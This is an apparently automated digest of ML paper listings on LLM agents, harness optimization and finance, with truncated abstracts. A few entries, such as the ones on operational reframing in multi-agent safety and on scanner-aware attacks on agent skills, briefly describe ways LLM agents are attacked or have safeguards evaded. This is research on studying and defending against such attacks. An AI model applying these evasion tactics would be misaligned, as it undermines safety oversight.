# Daily Paper Digest — 2026-11-13 (Friday)

| Source | Topics |
|--------|--------|
| AAAI · NeurIPS · ICML · ICLR · CVPR · KDD · ACL · EMNLP · NAACL · IJCAI · HuggingFace · OpenReview | Agent · Harness · Finance |

**466 unique papers** (588 topic-entries — cross-topic papers counted once per category)

---

## Agent  (313)

### AAAI

- **[CoDe: Communication Delay-Tolerant Multi-Agent Collaboration via Dual Alignment of Intent and Timeliness](https://arxiv.org/abs/2501.05207)**
  - *Shou-Cheng Song, You-Fang Lin, Sheng Han et al.*
  - **AAAI 2025** · `2025-01-09`
  - Communication has been widely employed to enhance multi-agent collaboration. Previous research has typically assumed delay-free communication, a strong assumption that is challenging to meet in practice. However, real-world agents suffer from channel delays, receiving messages se…


### NeurIPS

- **[AutoManifold: Agentic Design of Data Visualisation Algorithms via Manifold Embedding](https://arxiv.org/abs/2611.13710v1)**
  - *Burak Susam, Ruiyuan Kang, Tingting Mu*
  - **NeurIPS** · `2026-11-10`
  - Manifold embedding for data visualisation is dominated by a small set of hand-designed state-of-the-art (SOTA) algorithms. Their design targets are fixed at development time, resulting in inflexible algorithmic behaviour that cannot be readily steered towards user-specified struc…

- **[MLE-STAR: Machine Learning Engineering Agent via Search and Targeted Refinement](https://arxiv.org/abs/2506.15692)**
  - *Jaehyun Nam, Jinsung Yoon, Jie-Feng Chen et al.*
  - **NeurIPS 2025** · `2025-05-27`
  - Agents based on large language models (LLMs) for machine learning engineering (MLE) can automatically implement ML models via code generation. However, existing approaches to build such agents often rely heavily on inherent LLM knowledge and employ coarse exploration strategies t…

- **[Distilling LLM Agent into Small Models with Retrieval and Code Tools](https://arxiv.org/abs/2505.17612)**
  - *Minki Kang, Jongwon Jeong, Seanie Lee et al.*
  - **NeurIPS 2025** · `2025-05-23`
  - Large language models (LLMs) excel at complex reasoning tasks but remain computationally expensive, limiting their practical deployment. To address this, recent works have focused on distilling reasoning capabilities into smaller language models (sLMs) using chain-of-thought (CoT…

- **[R&D-Agent-Quant: A Multi-Agent Framework for Data-Centric Factors and Model Joint Optimization](https://arxiv.org/abs/2505.15155)**
  - *Yuan-Te Li, Xu Yang, Xiao Yang et al.*
  - **NeurIPS 2025** · `2025-05-21`
  - Financial markets pose fundamental challenges for asset return prediction due to their high dimensionality, non-stationarity, and persistent volatility. Despite advances in large language models and multi-agent systems, current quantitative research pipelines suffer from limited…

- **[MLZero: A Multi-Agent System for End-to-end Machine Learning Automation](https://arxiv.org/abs/2505.13941)**
  - *Hao-Yang Fang, Bo-Ran Han, Nick Erickson et al.*
  - **NeurIPS 2025** · `2025-05-20`
  - Existing AutoML systems have advanced the automation of machine learning (ML); however, they still require substantial manual configuration and expert input, particularly when handling multimodal data. We introduce MLZero, a novel multi-agent framework powered by Large Language M…

- **[Repo2Run: Automated Building Executable Environment for Code Repository at Scale](https://arxiv.org/abs/2502.13681)**
  - *Rui-Da Hu, Chao Peng, Xinchen Wang et al.*
  - **NeurIPS 2025** · `2025-02-19`
  - Scaling up executable code data is significant for improving language models'software engineering capability. The intricate nature of the process makes it labor-intensive, time-consuming and expert-knowledge-dependent to build a large number of executable code repositories, limit…


### ICML

- **[TrainExplorer: Autonomous LLM Post-Training via Plan-and-Decouple Exploration](https://openreview.net/forum?id=bz651zjpyk)**
  - **ICML 2025** · OpenReview · `2026-10-13`
  - LLM-based agents can automate model post-training, accelerating progress toward recursive self-improvement. Despite their promise, existing approaches remain under-explored and face two main challenges: (1) strategy lock-in that limits exploration beyond the initial strategy; and…

- **[ARTE: Agentic Refinement through Trade Execution for High-Frequency Trading Strategy Discovery](https://openreview.net/forum?id=VisvXioWmG)**
  - **ICML 2026** · OpenReview · `2026-10-12`
  - Existing LLM-based trading strategy development primarily uses aggregated price and volume data, which omit within-interval event order and displayed order book changes. Tick-level trade and quote observations preserve this information, but their scale makes the full history impr…

- **[Harness Self-Evolution: Theory, Algorithms, Evaluation, Applications, and Impact](https://openreview.net/forum?id=m5jsFGXUM2)**
  - *Chuyang Wei, Haoxiang Guan, Minghang Zhu et al.*
  - **ICML 2025** · OpenReview · `2026-10-11`
  - Building agents that learn from experience is a central goal of artificial intelligence. Harness self-evolution offers a path toward this goal by adapting the system around a fixed base model. This article develops a unified framework for examining how execution feedback produces…

- **[DS-Lighting: Making Agent Harnesses Explicit for Data-Science Automation](https://openreview.net/forum?id=m7wsVqhIYs)**
  - **ICML 2025** · OpenReview · `2026-10-11`
  - Large Language Model (LLM) agents have shown promise for automating data-science workflows, yet their end-to-end performance depends critically on the agent harness that represents tasks, manages execution state, constrains output artifacts, and provides evaluation feedback. Exis…

- **[FLRT: Learning Efficient Tool Use from Tool-Sufficient States](https://openreview.net/forum?id=1OmQc2z5qY)**
  - **ICML 2025** · OpenReview · `2026-09-19`
  - Tool-augmented reasoning substantially extends the capability of large language models to solve complex problems, but frequent tool use also incurs additional interaction and execution costs. We observe that tool necessity changes dynamically along a reasoning trajectory: a model…

- **[TradingArena: A Market-Making Benchmark for Ranking, Diagnosing, and Steering LLM Behavior](https://openreview.net/forum?id=6VObvVwaGZ)**
  - **ICML 2025** · OpenReview · `2026-09-19`
  - As large language models are increasingly deployed as agents, evaluation should capture both task performance and interactive behavior. Few benchmarks jointly measure performance and behavior under controlled changes to an agent’s information, action space, and inference. We intr…

- **[Can Harness Optimization Improve Agents? Generalizable Gains Versus Evaluation Noise](https://openreview.net/forum?id=Ri0rU3rPOS)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Harness optimization methods revise an agent’s prompts, tools, memory, and run-
time control without updating model weights. We ask which of their improve-
ments can be distinguished from evaluation noise, and where the reliable ones
come from. We evaluate Meta-Harness, Agentic H…

- **[Harness-Zero: Harness Distillation via Agent-as-Harness](https://openreview.net/forum?id=rZ7eO7DZmc)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Agent harnesses, the external systems that mediate model-environment interaction, can substantially improve agent performance, but their gains remain tied to the harness at deployment. Because the best harness varies across domains, instances, and models, a general-purpose agent…

- **[TAME: Transfer-Aware Model-Harness Co-Evolution through Learned Harness Revisions](https://openreview.net/forum?id=IXnpSW8g3v)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Agentic post-training uses an execution harness both to help the model act and to produce the trajectories from which it learns. A harness that raises immediate success need not leave behind a model that performs well once that support changes. We measure this difference with cro…

- **[Hypothesis-Conditioned Evaluation for Efficient Harness Optimization](https://openreview.net/forum?id=q55gCb73ub)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Harness optimization improves an LLM agent by editing its prompts, tools
and helper code with model weights fixed. Evaluating every edit on
every training task is expensive, but a small random sample can miss the
failure that motivated the edit. We introduce \emph{Hypothesis-Cond…

- **[Harness-Delta Attribution: Dissecting Gains From Harness Evolution](https://openreview.net/forum?id=PX4Zpvsaca)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Harness evolution automatically optimizes the prompts, skills, tools, and orchestration code around a fixed-weight model, offering a way to improve agentic systems without updating model weights. The agent harness is iteratively optimized to achieve higher performance on the sear…

- **[Visual Reasoning at the Harness Level: A Ladder for Controlled Evaluation](https://openreview.net/forum?id=8Rdl9qkU1A)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Advances in foundation models are shifting coding and working agents from predefined tools toward general computational environments. Yet existing visual agents often couple model, harness, and training choices, making it difficult to determine how this transition affects visual…

- **[AURA-Eval: Evaluation Framework for Acting Under Risk Awareness in LLM Agent Trajectories](https://openreview.net/forum?id=9XfH1iAA4W)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - LLM agents are increasingly taking actions with real consequences, yet safety evaluations often reduce their behavior to a final safe or unsafe outcome, obscuring whether the agent recognized the risk and how it responded. We introduce AURA-Eval, a framework for evaluating whethe…

- **[ParaFusionBench: A Unified Benchmark for Cross-Paradigm Fusion in Factor Mining and Trading Decision-Making](https://openreview.net/forum?id=nqb5xH3QuC)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Quantitative investment research has evolved from conventional models to large language models (LLMs) and multi-agent collaboration, forming two primary research trajectories: factor mining and trading decision-making. Their intersection yields four paradigms: Conventional Factor…

- **[Rethinking the Evaluation of Harness Evolution for Agents](https://openreview.net/forum?id=QDdWiaNkk2)**
  - **ICML 2025** · OpenReview · `2026-09-17`
  - Harness evolution is an iterative search procedure that repeatedly evaluates and revises candidate harnesses used for LLM agents using task feedback. We revisit the evaluation of such automatic harness evolution procedures and identify two fundamental issues in the protocol. Firs…

- **[Harness-MAP: Budget-Efficient Harness Search via Structure-Token Factorization](https://openreview.net/forum?id=HM48DQvAqS)**
  - **ICML 2025** · OpenReview · `2026-09-17`
  - Automating harness evolution via naive meta-agent search is prohibitively expensive, requiring hundreds of meta-agent calls and minutes-to-hours per evaluation.
How can we efficiently search for a diverse set of high-quality harnesses under a tight evaluation budget?
To address t…

- **[FinancialAuditBench: Benchmark Construction under Differential Privacy Using Real-World Priors](https://openreview.net/forum?id=RKKGxm7O4L)**
  - **ICML 2025** · OpenReview · `2026-09-16`
  - As AI agents are becoming widely adopted in the financial services industry, careful measurement is essential to understand where they can be reliably deployed and where oversight and professional review remain necessary. Such measurement, however, is constrained by limited acces…

- **[PortfolioRouter: Consequence-Aware Multi-Task Routing for Portfolio Agents](https://openreview.net/forum?id=My6dyV7ecS)**
  - **ICML 2025** · OpenReview · `2026-09-14`
  - Portfolio agents can recommend materially different allocations for the same trading date, but standard best-expert classification does not weight errors by their financial cost. The cost of a routing error depends on the return forgone by choosing one proposal over another. We i…

- **[Turbo Harness: Instance-Adaptive Harness Optimization](https://openreview.net/forum?id=Iyc8G0eNib)**
  - **ICML 2025** · OpenReview · `2026-09-13`
  - Designing effective harnesses with minimal human intervention is an important challenge for building modern agents. Existing automated harness optimization methods typically produce a single global harness that is applied uniformly across future problem instances. However, a harn…

- **[CHART: A Harness-Rotation Curriculum for Harness-Robust Search Agents](https://openreview.net/forum?id=HdwZqmT4Ld)**
  - *{'username': '~Xinlu_Zhang1', 'fullname': 'Xinlu Zhang', 'institutions': [{'name': 'Amazon', 'domain': 'amazon.com', 'country': 'US'}]}, {'username': '~Ying-Chun_Lin2', 'fullname': 'Ying-Chun Lin', 'institutions': [{'name': 'Amazon', 'domain': 'amazon.com', 'country': 'US'}]}, {'username': '~Zhihan_Zhang2', 'fullname': 'Zhihan Zhang', 'institutions': [{'name': 'Amazon', 'domain': 'amazon.com', 'country': 'US'}]} et al.*
  - **ICML 2025** · OpenReview · `2026-08-28`
  - Search agents are usually trained under a single harness. But once an agent is deployed in a real application, its harness is frequently updated (e.g., a rewritten system prompt) to fit production needs. This exposes a fragility of post-trained agents: because a learned behavior…

- **[AgenticRag-R1: Agentic Reinforcement Learning with Stack Memory for Multi-Step Reasoning, Retrieval and Memorizing](https://arxiv.org/abs/2608.29622)**
  - *{'fullname': 'Xinke Jiang', 'username': ''}, {'fullname': 'Yue Fang', 'username': ''}, {'fullname': 'Zhibang Yang', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2026-08-01`
  - Retrieval-Augmented Generation (RAG) improves the factuality of large language models (LLMs), yet existing RAG systems often struggle with complex, multi-step reasoning that requires adaptive retrieval and continuous revision of intermediate contexts. Recent reinforcement learnin…

- **[Harness Engineering for LLM Agents: A Survey of Harness Component Taxonomy, Evaluation, and Model--Harness Coevolution](https://openreview.net/forum?id=1VJLY0hAFT)**
  - **ICML 2025** · OpenReview · `2026-07-03`
  - As large language model-driven autonomous agents are increasingly deployed in real-world long-horizon, open-environment tasks, foundation models expose systematic capability gaps in context retention, reliable tool invocation, persistent state management, and multi-step execution…

- **[A Fraud-Detection-Inspired Framework for LLM Agents Security](https://openreview.net/forum?id=uUipgSY8Sh)**
  - *Sheldon Yu, Yingcheng Sun, Hanqing Guo et al.*
  - **ICML 2025** · OpenReview · `2026-06-12`
  - Large Language Model (LLM) agents demonstrate strong capabilities in autonomous task execution, tool use, and multi-step reasoning. However, their increasing autonomy also introduces a new attack surface: adversarial interactions can manipulate agent behavior through direct promp…

- **[The Scaffold Effect in Coding Agents: Harness Choice as a Hidden Variable in Coding-Agent Evaluation](https://openreview.net/forum?id=1sqKRqsaE9)**
  - *Naman Vats, Oleg Aleksandrovich Golev*
  - **ICML 2025** · OpenReview · `2026-06-10`
  - Public leaderboards for coding agents typically rank systems by model name and pass rate, while the surrounding harness—the scaffold that issues tools, manages context, and decides when to stop—is often under-specified. Model-to-model comparison is valid when the harness is fixed…

- **[Scanner-Aware Coordinated Attacks on LLM Agent Skills](https://openreview.net/forum?id=HiqcfJyIUF)**
  - *Tongyan Hu, Xiaogeng Liu, Bryan Hooi et al.*
  - **ICML 2025** · OpenReview · `2026-06-05`
  - With the rapid development of Large Language Model (LLM) agents, these agents increasingly rely on skills—modular capabilities that combine natural language specifications with executable code across multiple modalities—to extend agent behavior at scale. As skills become a key me…

- **[FairCoder: Probing LLM Bias in High-Stakes Decision Making via Coding Tasks](https://openreview.net/forum?id=n7Mk11IVX8)**
  - *Yongkang Du, Jen-tse Huang, Jieyu Zhao et al.*
  - **ICML 2025** · OpenReview · `2026-06-03`
  - Large language models (LLMs) are increasingly used in high-stakes decisions such as hiring and college admissions, making their social bias a critical concern. While LLMs are trained to refuse explicitly biased requests, bias can be leaked implicitly during LLM planning and reaso…

- **[Operational Reframing and Approval-Framed Delegation in Multi-Agent LLM Safety](https://openreview.net/forum?id=7UXZAFMvpZ)**
  - *Lifei Liu, Haoran Yu, Xiaochong Jiang et al.*
  - **ICML 2025** · OpenReview · `2026-05-26`
  - Safety evaluations of multi-agent LLM systems often compare a direct prompt against a planner-executor pipeline and report the difference as a single "pipeline effect." This aggregate hides
  several simultaneous changes: harmful intent may be recast as plausible operational work…

- **[AgenticRec: A Recommendation-Oriented Agentic Framework with Progressive Tool-Integrated Reasoning Optimization](https://openreview.net/forum?id=hrSwV2oSqz)**
  - **ICML 2025** · OpenReview · `2026-05-26`
  - Recommender agents built on Large Language Models offer a promising paradigm for personalized recommendation. However, existing agents typically suffer from a misalignment between their tool-integrated reasoning trajectories and recommendation feedback, limiting their ability to…

- **[MacCode Lab: A Reproducible Single-Machine Harness for Execution-Guided Code Agents, and When Repair Actually Helps](https://openreview.net/forum?id=nsQjG3V0Fi)**
  - *Mayank Sharma, Rohit Kumar Mourya*
  - **ICML 2025** · OpenReview · `2026-05-22`
  - Code-agent evaluation is increasingly repeated as models, prompts, and agent components change, rather than performed only once as a leaderboard exercise. Practitioners need evaluation that runs economically on local hardware and identifies which parts of an agent loop contribute…

- **[AgenticRag-R1: Agentic Reinforcement Learning with Stack Memory for Multi-Step Reasoning, Retrieval and Memorizing](https://openreview.net/forum?id=IzKJV1g5jX)**
  - **ICML 2025** · OpenReview · `2026-05-17`
  - Retrieval-Augmented Generation (RAG) improves the factuality of large language models (LLMs), yet existing RAG systems often struggle with complex, multi-step reasoning that requires adaptive retrieval and continuous revision of intermediate contexts.
Recent reinforcement learnin…

- **[AEVAL: From Anecdotal to Deterministic Testing for Agentic Skill Workflows](https://openreview.net/forum?id=tpEflAIlo5)**
  - *Tejas Singh Anand, Yuet Ying Christina Wang, Wanting Jiang et al.*
  - **ICML 2025** · OpenReview · `2026-05-02`
  - Modern agentic systems increasingly rely on skills: installable packages of natural language and code that teach an LLM agent how to perform a domain task. As skill repositories grow, developers need automated, trustworthy quality signals on every change to a skill, yet most eval…

- **[Towards Direct Evaluation of Harness Optimizers via Priority Ranking](https://arxiv.org/abs/2605.22505)**
  - *{'fullname': 'Kai Tzu-iunn Ong', 'username': ''}, {'fullname': 'Minseok Kang', 'username': ''}, {'fullname': 'Dongwook Choi', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2026-05-01`
  - Harness optimization enables automated agent creation by having an optimizer agent iteratively update the harness of target agents. Despite its success, current studies evaluate optimizers solely by observing target agents' performance gains. This indirect end-improvement evaluat…

- **[The Tool Illusion: Rethinking Tool Use in Web Agents](https://openreview.net/forum?id=gQwin40zgt)**
  - *Renze Lou, Baolin Peng, Wenlin Yao et al.*
  - **ICML 2025** · OpenReview · `2026-03-14`
  - As web agents rapidly evolve, an increasing body of work has moved beyond conventional atomic browser interactions and explored tool use as a higher-level action paradigm. Although prior studies have shown the promise of tools, their conclusions are often drawn from limited exper…

- **[AgenticGEO: A Self-Evolving Agentic System for Generative Engine Optimization](https://arxiv.org/abs/2603.20213)**
  - *{'fullname': 'Jiaqi Yuan', 'username': ''}, {'fullname': 'Jialu Wang', 'username': ''}, {'fullname': 'Zihan Wang', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2026-03-01`
  - Generative search engines represent a transition from traditional ranking-based retrieval to Large Language Model (LLM)-based synthesis, transforming optimization goals from ranking prominence towards content inclusion. Generative Engine Optimization (GEO), specifically, aims to…

- **[Modeling Fairness as an Evolving Social Consensus via LLM-Based Multi-Agent Simulation](https://openreview.net/forum?id=BEA4PVipWF)**
  - **ICML 2025** · OpenReview · `2026-02-20`

- **[A multi-agent system for financial retrieval](https://openreview.net/forum?id=X86jxEIVtX)**
  - **ICML 2025** · OpenReview · `2026-02-11`

- **[Locomo-Plus: Beyond-Factual Cognitive Memory Evaluation Framework for LLM Agents](https://openreview.net/forum?id=QGJrLaES6h)**
  - *{'fullname': 'Yifei Li', 'username': ''}, {'fullname': 'Weidong Guo', 'username': ''}, {'fullname': 'Lingling Zhang', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2026-01-01`
  - Long-term conversational memory is a core capability for LLM-baseddialogue systems, yet existing benchmarks and evaluation protocolsprimarily focus on surface-level factual recall.In realistic interactions, appropriate responses often depend onimplicit constraints such as user st…

- **[Conversational Agents: A Framework for Evaluation (CAFE) (Dagstuhl Perspectives Workshop 24352)](https://openreview.net/forum?id=rpLDo1d8oU)**
  - *{'fullname': 'Christine Bauer', 'username': '~Christine_Bauer1'}, {'fullname': 'Li Chen'}, {'fullname': 'Nicola Ferro'} et al.*
  - **ICML 2025** · OpenReview · `2025-12-19`
  - During the workshop, we deeply discussed what CONversational Information ACcess (CONIAC) is and its unique features, proposing a world model abstracting it, and defined the Conversational Agents Framework for Evaluation (CAFE) for the evaluation of CONIAC systems, consisting of s…

- **[Text to SQL in Agentics](https://openreview.net/forum?id=DcmJC1HLUk)**
  - **ICML 2025** · OpenReview · `2025-11-21`

- **[RAPTOR: Reasoned Agentic Portfolio Trading with Orchestrated Rebalancing](https://openreview.net/forum?id=ziuTkKhgT0)**
  - *Blake Almon, Matthew Caliboso, Alex Kim et al.*
  - **ICML 2025** · OpenReview · `2025-10-28`
  - We propose an institutional-style, multi-agent architecture for equity portfolio construction that couples a schema-constrained blackboard with structured debate and a Black-Litterman optimizer, enabling diversified, risk-aware allocations. The system is scalable, modular, and in…

- **[AgenticMath: Enhancing LLM Reasoning via Agentic-based Math Data Generation](https://arxiv.org/abs/2510.19361)**
  - *Xianyang Liu, Yilin Liu, Shuai Wang et al.*
  - **ICML 2025** · OpenReview · `2025-10-01`
  - The creation of high-quality datasets to improve Large Language Model (LLM) reasoning remains a significant challenge, as current methods often suffer from generating low-quality/incorrect answers and limited information richness from available data sources. To address this, we p…

- **[AgentRace: Benchmarking Efficiency in LLM Agent Frameworks](https://openreview.net/forum?id=eUuxWAQA5F)**
  - *Yanling Xu, bangwei zeng, Zeyu Qiu et al.*
  - **ICML 2025** · OpenReview · `2025-09-19`
  - Large Language Model (LLM) agents are rapidly gaining traction across domains such as intelligent assistants, programming aids, and autonomous decision systems. While existing benchmarks focus primarily on evaluating the effectiveness of LLM agents, such as task success rates and…

- **[AgenticIQA: An Agentic Framework for Adaptive and Interpretable Image Quality Assessment](https://openreview.net/forum?id=PZq5RtJDUK)**
  - *Hanwei Zhu, Yu TIAN, Keyan Ding et al.*
  - **ICML 2025** · OpenReview · `2025-09-18`
  - Image quality assessment (IQA) is inherently complex, as it reflects both the quantification and interpretation of perceptual quality rooted in the human visual system. Conventional approaches typically rely on fixed models to output scalar scores, limiting their adaptability to…

- **[AgenticMath: Enhancing LLM Reasoning via Agentic-based Math Data Generation](https://openreview.net/forum?id=2aA6YwZYOJ)**
  - *Xianyang Liu, Yilin LIU, Shuai Wang et al.*
  - **ICML 2025** · OpenReview · `2025-09-18`
  - The creation of high-quality datasets to improve Large Language Model (LLM) reasoning remains a significant challenge, as current methods often suffer from generating low-quality/incorrect answers and limited information richness from available data sources. To address this, we p…

- **[Multi-target Parallel Drug Discovery with Multi-agent Orchestration](https://openreview.net/forum?id=AhFsKmuaCb)**
  - *AI Agent, Fuad Al Abir, Sixue Zhang et al.*
  - **ICML 2025** · OpenReview · `2025-09-17`
  - The immense cost and high failure rates of traditional drug discovery necessitate a shift towards more systematic, automated approaches. While specialized AI tools have excelled at individual tasks, their integration into a cohesive, end-to-end discovery workflow remains a signif…

- **[Economic Confidentiality without Secrets: Making Intercepted LLM-Agent Communications Unusable](https://openreview.net/forum?id=sJbC5vtT2v)**
  - *Bolaji Makinde*
  - **ICML 2025** · OpenReview · `2025-09-16`
  - We study whether LLM agents can exchange useful information over a public channel without secrets (no keys, no TEEs) while making unauthorized decoding economically impractical. We formalize an “economic confidentiality” objective and design a stochastic “private language” ${L_r}…

- **[QuantAgent: Price-Driven Multi-Agent LLMs for High-Frequency Trading](https://openreview.net/forum?id=fdKmhFYcQv)**
  - *Fei Xiong, Xiang Zhang, Aosong Feng et al.*
  - **ICML 2025** · OpenReview · `2025-09-08`
  - Recent advances in Large Language Models (LLMs) have shown remarkable capabilities in financial reasoning and market understanding. Multi-agent LLM frameworks such as TradingAgent and FINMEM augment these models to long-horizon investment tasks by leveraging fundamental and senti…

- **[The Social Laboratory: A Psychometric Framework for Multi-Agent LLM Evaluation](https://openreview.net/forum?id=5Larp1U1Mq)**
  - *Zarreen Reza*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - As Large Language Models (LLMs) transition from static tools to autonomous agents, traditional evaluation benchmarks that measure performance on downstream tasks are becoming insufficient. These methods fail to capture the emergent social and cognitive dynamics that arise when ag…

- **[Medical AI Consensus: A Multi-Agent Framework for  Radiology Report Generation and Evaluation](https://openreview.net/forum?id=BwvWrnPzfZ)**
  - *Ahmed Tamer El Boardy, Ghada Khoriba, Essam Rashed*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - Automating radiology report generation poses a dual challenge: building clinically reliable systems and designing rigorous evaluation protocols. We introduce a multi-agent reinforcement learning framework that serves as both a benchmark and evaluation environment for multimodal c…

- **[A Protocol-Driven Platform for Agent-Agnostic Evaluation of LLM Agents](https://openreview.net/forum?id=G9YKfCddN3)**
  - *Cong Minh Tran, Issam Falih, Hatim CHAHDI et al.*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - The fast growth of LLM-based agents has outpaced efforts to build solid evaluation standards, causing mismatched formats and idiosyncratic reporting that often makes fair comparisons challenging. To tackle this, we created a platform around a protocol-based setup that keeps evalu…

- **[How to Train Your LLM Web Agent: A Statistical Diagnosis](https://openreview.net/forum?id=HBx2K7SVYh)**
  - *Dheeraj Vattikonda, Santhoshi Ravichandran, Emiliano Penaloza et al.*
  - **ICML 2025** · OpenReview · `2025-09-03`
  - LLM-based web agents have recently made significant progress, but much of it has
occurred in closed-source systems—widening the gap with open-source alternatives.
Progress has been held back by two key challenges—first, a narrow focus on single-
step tasks that overlooks the comp…

- **[AsymPuzl: An Asymmetric Puzzle for multi-agent cooperation](https://openreview.net/forum?id=SXcJh8hoLz)**
  - *Xavier Cadet, Edward Koh, Peter Chin*
  - **ICML 2025** · OpenReview · `2025-09-03`
  - Large Language Model (LLM) agents are increasingly studied in multi-turn, multi-agent scenarios, yet most existing setups emphasize open-ended role-play rather than controlled evaluation.
We introduce AsymPuzl, a minimal but expressive two-agent puzzle environment designed to iso…

- **[Toward Community-Driven Agents for Machine Learning Engineering](https://openreview.net/forum?id=aKChEjaJpZ)**
  - *Sijie Li, Weiwei Sun, Shanda Li et al.*
  - **ICML 2025** · OpenReview · `2025-09-03`
  - Large language model-based machine learning (ML) agents have shown great promise in automating ML research.
However, existing agents typically operate in isolation on a given research problem, without engaging with the broader research community, where human researchers often gai…

- **[Reinforcing Multi-Turn Reasoning in LLM Agents via Turn-Level Reward Design and Credit Assignment](https://openreview.net/forum?id=drP7qVUnUt)**
  - *Quan Wei, Siliang Zeng, Chenliang Li et al.*
  - **ICML 2025** · OpenReview · `2025-09-02`
  - This paper investigates approaches to enhance the reasoning capabilities of Large Language Model (LLM) agents using Reinforcement Learning (RL).  Specifically, we focus on long-horizon multi-turn agent scenarios, which can be naturally modeled as Markov Decision Processes.  Altho…

- **[Orchestrator: Active Inference for Multi-Agent Systems in Long-Horizon Tasks](https://openreview.net/forum?id=21sPEvGUL2)**
  - *Lukas Beckenbauer, Johannes-Lucas Löwe, Ge Zheng et al.*
  - **ICML 2025** · OpenReview · `2025-09-02`
  - Complex, non-linear tasks challenge LLM-enhanced multi-agent systems (MAS) due to partial observability and suboptimal coordination. We propose Orchestrator, a novel MAS framework that leverages attention-inspired self-emergent coordination and reflective benchmarking to optimize…

- **[The Automated but Risky Game: Modeling Agent-to-Agent Negotiations and Transactions in Consumer Markets](https://openreview.net/forum?id=XZpIu68yW6)**
  - *Shenzhe Zhu, Jiao Sun, Yi Nian et al.*
  - **ICML 2025** · OpenReview · `2025-09-01`
  - AI agents are increasingly used in consumer-facing applications to assist with tasks such as product search, negotiation, and transaction execution. In this paper, we investigate a future setting where both consumers and merchants authorize AI agents to automate the negotiations…

- **[Multi-Turn LLM Systems for Diagnostic Decision-Making: Considerations, Biases, and Challenges](https://openreview.net/forum?id=It7AgR3A9H)**
  - *Benjamin Liu, Sejong Kim, Drona Thoka et al.*
  - **ICML 2025** · OpenReview · `2025-09-01`
  - This study investigates the systemic limitations and architectural design trade-offs of Large Language Model multi-agent systems (LLM-MAS) for clinical decision support, focusing on how agent collaboration and architectural choices influence reasoning in complex medical problems.…

- **[Offline Policy Evaluation of Multi-Turn LLM Health Coaching with Real Users](https://openreview.net/forum?id=BE00LfP4Dv)**
  - *Melik Ozolcer, Sang Won Bae*
  - **ICML 2025** · OpenReview · `2025-09-01`
  - We study a web-deployed, tool-augmented LLM health coach with real users. In a pilot with seven users (280 rated turns), offline policy evaluation (OPE) over factorized decision heads (Tool/Style) shows that a uniform heavy-tool policy raises average value on logs but harms speci…

- **[Traxgen: Ground-Truth Trajectory Generation for AI Agent Evaluation](https://openreview.net/forum?id=pERJAy5kI1)**
  - *Maria Emilia Mazzolenis, Ruirui Zhang*
  - **ICML 2025** · OpenReview · `2025-09-01`
  - As AI agents take on complex, goal-driven workflows, response-level evaluation becomes insufficient. Trajectory‐level evaluation offers deeper insight but typically relies on high‑quality reference trajectories that are costly to curate or prone to LLM noise. We introduce \texttt…

- **[Disclosure Audits for LLM Agents](https://openreview.net/forum?id=BV6QBwZkfK)**
  - *Saswat Das, Jameson Sandler, Ferdinando Fioretto*
  - **ICML 2025** · OpenReview · `2025-09-01`
  - LLM agents have begun to appear as personal assistants, customer service bots, and clinical aides. While these applications deliver substantial operational benefits, they also require continuous access to sensitive data, which increases the likelihood of unauthorized disclosures.…

- **[Multi-Agent-as-Judge: Aligning LLM-Agent-Based Automated Evaluation with Multi-Dimensional Human Evaluation](https://openreview.net/forum?id=7AetgL7eVL)**
  - *Jiaju Chen, Yuxuan Lu, Xiaojie Wang et al.*
  - **ICML 2025** · OpenReview · `2025-08-31`
  - Nearly all human work is collaborative; thus, the evaluation of real-world NLP applications often requires multiple dimensions that align with diverse human perspectives. As real human evaluator resources are often scarce and costly, the emerging “LLM-as-a-judge” paradigm sheds l…

- **[RAFFLES: Reasoning-based Attribution of Faults for LLM Systems](https://openreview.net/forum?id=0oxelK4W6c)**
  - *Chenyang Zhu, Spencer Hong, Jingyu Wu et al.*
  - **ICML 2025** · OpenReview · `2025-08-29`
  - We have reached a critical roadblock in the development and enhancement of long-horizon, multi-component LLM agentic systems: it is incredibly tricky to identify where these systems breakdown and why. Evaluation capabilities that currently exist today (e.g., single pass LLM-as-a-…

- **[Improved Multi-Agent Collaboration with Multi-Turn Reinforcement Learning](https://openreview.net/forum?id=WYfzRJgWbO)**
  - *Shuo Liu, Tianle Chen, Christopher Amato*
  - **ICML 2025** · OpenReview · `2025-08-22`
  - A large amount of work has been done in Multi-Agent Systems (MAS) for modeling and solving problems with multiple interacting agents.  However, most LLMs are pretrained independently and not specifically optimized for coordination. Existing LLM fine-tuning frameworks rely on indi…

- **[CORE: Measuring Multi-Agent LLM Interaction Quality under Game-Theoretic Pressures](https://openreview.net/forum?id=cArAB6Sj5X)**
  - *Punya Syon Pandey, Yongjin Yang, Jiarui Liu et al.*
  - **ICML 2025** · OpenReview · `2025-08-17`
  - Game-theoretic interactions between agents with Large Language Models (LLMs) have revealed many emergent capabilities, yet the linguistic diversity of these interactions has not been sufficiently quantified. In this paper, we present the Conversational Robustness Evaluation Score…

- **[Scalability of LLM-Based Multi-Agent Systems for Scientific Code Generation: A Preliminary Study](https://openreview.net/forum?id=h8KFX5HM3N)**
  - *Yuru Wang, Kaiyan Zhang, Kai Tian et al.*
  - **ICML 2025** · OpenReview · `2025-08-16`
  - Recent studies indicate that LLM-based Multi-Agent Systems (MAS) encounter scalability challenges in complex mathematical problem-solving or coding tasks, exhibiting issues such as inconsistent role adherence and ineffective inter-agent communication. Moreover, the performance ad…

- **[Agentic Design Review System](https://arxiv.org/abs/2508.10745)**
  - *Sayan Nag, K. J. Joseph, Koustava Goswami et al.*
  - **ICML 2025** · OpenReview · `2025-08-01`
  - Evaluating graphic designs involves assessing it from multiple facets like alignment, composition, aesthetics and color choices. Evaluating designs in a holistic way involves aggregating feedback from individual expert reviewers. Towards this, we propose an Agentic Design Review…

